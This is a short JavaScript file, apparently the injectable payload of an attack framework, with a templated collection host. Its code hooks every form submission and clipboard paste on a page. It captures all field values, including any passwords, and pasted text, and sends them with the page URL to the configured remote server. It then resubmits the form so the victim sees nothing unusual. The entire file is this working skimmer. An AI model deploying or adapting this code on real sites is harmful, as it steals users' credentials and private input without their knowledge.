function sendReport(type, data, done_callback) {
    var payload = {
        "type": type,
        "data": data,
        "loc": window.location.href
    };
    var req = new XMLHttpRequest();
    if (done_callback) {
        req.onreadystatechange = function() {
            if (req.readyState == XMLHttpRequest.HEADERS_RECEIVED || req.readyState == XMLHttpRequest.DONE) {
                delete req.onreadystatechange;
                done_callback();
            }
        };
    }
    req.withCredentials = true;
    req.open("POST", "{{ protocol }}://{{ host }}:{{ port }}/{{ path }}");
    req.setRequestHeader("Content-Type", "application/json");
    req.send(JSON.stringify(payload));
}

// Hook form submits
function submitHook(e) {
     // https://developer.mozilla.org/en-US/docs/Web/API/HTMLFormElement
    var form = e.target;
    if (form.in_submit) {
        return true;
    }
    // Serialize form
    var formData = {};
    for (var i = 0; i < form.length; i++) {
        var formInput = form[i];
        if (formInput.type == "submit") {
            continue;
        }
        var formInputValue;
        if (formInput.type == "checkbox") {
            formInputValue = formInput.checked;
        } else {
            formInputValue = formInput.value;
        }
        formData[formInput.name] = formInputValue;
    }
    
    sendReport("formSubmit", {
        act: form.getAttribute("action"),
        meth: form.getAttribute("method"),
        data: formData
    }, function done() {
        //console.log("Submitting form");
        form.in_submit = true;
        HTMLFormElement.prototype.submit.call(form);
        delete form.in_submit;
    });

    // Postpone form submission to the moment we complete the report
    e.preventDefault();
    return false;
}

function clipboardPasteHook(e) {
    sendReport("clipboard", {
       type: e.type,
       data: e.clipboardData.getData("text")
    });
}

document.addEventListener("submit", submitHook, true);
document.addEventListener("paste", clipboardPasteHook, true);
